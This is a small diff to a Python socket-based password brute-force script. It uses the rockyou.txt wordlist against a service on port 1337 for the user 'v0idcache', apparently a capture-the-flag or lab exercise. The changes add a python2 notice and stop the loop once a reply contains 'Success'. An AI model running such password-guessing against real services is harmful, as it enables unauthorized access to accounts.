@@ -9,6 +9,8 @@ port = 1337
 wordlist = "rockyou.txt"
 username = "v0idcache"
 
+print("Requires use of python2")
+
 def brute_force(word):
     print("="*80)
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -26,6 +28,8 @@ def brute_force(word):
 
     print("Recieved data: " + data)
 
+    if "Success" in data:
+        exit()
    
 if __name__ == '__main__':
     with open(wordlist) as fp:
